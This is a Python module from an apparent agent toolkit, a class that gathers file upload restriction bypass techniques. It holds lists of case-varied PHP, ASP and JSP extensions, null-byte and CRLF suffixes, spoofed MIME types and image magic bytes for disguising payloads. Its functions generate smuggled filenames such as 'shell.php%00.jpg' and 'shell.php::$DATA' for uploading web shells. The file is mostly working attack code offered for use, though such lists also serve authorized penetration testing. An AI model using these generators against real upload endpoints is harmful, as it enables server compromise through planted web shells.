#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from typing import List, Dict, Any


class FileUploadIntelligence:
    """
    Consolidates logic for bypassing file upload restrictions.
    Derived from tools like upload_bypass and manual techniques.
    """

    PHP_EXTENSIONS = [
        ".php",
        ".php2",
        ".php3",
        ".php4",
        ".php5",
        ".php6",
        ".php7",
        ".phps",
        ".pht",
        ".phtm",
        ".phtml",
        ".pgif",
        ".shtml",
        ".htaccess",
        ".phar",
        ".inc",
        ".hphp",
        ".ctp",
        ".module",
        ".pHp",
        ".PhP2",
        ".PhP3",
        ".PhP4",
        ".PhP5",
        ".PhP6",
        ".PhP7",
        ".PhPs",
        ".pHt",
        ".pHtm",
        ".pHtMl",
    ]

    ASP_EXTENSIONS = [
        ".asp",
        ".aspx",
        ".config",
        ".ashx",
        ".asmx",
        ".aspq",
        ".axd",
        ".cshtm",
        ".cshtml",
        ".rem",
        ".soap",
        ".vbhtm",
        ".vbhtml",
        ".asa",
        ".cer",
        ".shtml",
        ".aSp",
        ".aSpX",
        ".cOnFig",
        ".aShx",
        ".aSmX",
        ".aSpq",
        ".aXd",
        ".cShtMl",
    ]

    JSP_EXTENSIONS = [
        ".jsp",
        ".jspx",
        ".jsw",
        ".jsv",
        ".jspf",
        ".wss",
        ".do",
        ".action",
        ".jSp",
        ".jSpX",
        ".jSw",
        ".jSv",
        ".jsPf",
    ]

    COLDFUSION_EXTENSIONS = [".cfm", ".cfml", ".cfc", ".dbm"]
    PERL_EXTENSIONS = [".pl", ".cgi"]

    BYPASS_SUFFIXES = ["%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "....", ".", ". ", " .", " "]

    COMMON_MIME_TYPES = [
        "image/jpeg",
        "image/png",
        "image/gif",
        "application/pdf",
        "text/plain",
        "video/mp4",
        "audio/mpeg",
    ]

    @staticmethod
    async def get_extension_variants(base_extension: str) -> List[str]:
        """Generates common bypass variants for a core extension (e.g. .php)."""
        variants = []
        if "php" in base_extension.lower():
            variants.extend(FileUploadIntelligence.PHP_EXTENSIONS)
        elif "asp" in base_extension.lower():
            variants.extend(FileUploadIntelligence.ASP_EXTENSIONS)
        elif "jsp" in base_extension.lower():
            variants.extend(FileUploadIntelligence.JSP_EXTENSIONS)

        # Add double extensions
        variants.append(f"{base_extension}{base_extension}")

        return list(set(variants))

    @staticmethod
    async def get_obfuscated_filenames(filename: str, allowed_ext: str) -> List[str]:
        """Generates filenames with null bytes or multiple extensions."""
        results = []
        name_part = filename.split(".")[0]
        ext_part = "." + filename.split(".")[-1]

        for suffix in FileUploadIntelligence.BYPASS_SUFFIXES:
            # Null byte / suffix bypasses
            results.append(f"{name_part}{ext_part}{suffix}.{allowed_ext}")
            results.append(f"{name_part}.{allowed_ext}{suffix}{ext_part}")

        return results

    @staticmethod
    async def get_magic_bytes_headers() -> Dict[str, bytes]:
        """Returns magic bytes for common image types to prepend to payloads."""
        return {
            "jpeg": b"\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01",
            "png": b"\x89\x50\x4e\x47\x0d\x0a\x1a\x0a",
            "gif": b"GIF89a",
            "pdf": b"%PDF-1.4",
        }

    @staticmethod
    async def get_upload_attack_vectors() -> List[Dict[str, Any]]:
        """Returns a list of high-level attack strategies for file uploads."""
        return [
            {"name": "Extension Bypass", "method": "Brute force alternative extensions (e.g., .phtml for .php)"},
            {"name": "MIME Type Spoofing", "method": "Set Content-Type header to image/jpeg while uploading script"},
            {"name": "Magic Bytes Prepending", "method": "Prepend JPG/PNG magic bytes to a web shell file"},
            {"name": "Null Byte Injection", "method": "Use %00 to terminate filename (e.g., shell.php%00.jpg)"},
            {"name": "Double Extension", "method": "Use names like shell.jpg.php or shell.php.jpg"},
            {"name": "NTFS Alternate Data Streams", "method": "On Windows, use shell.php::$DATA"},
        ]
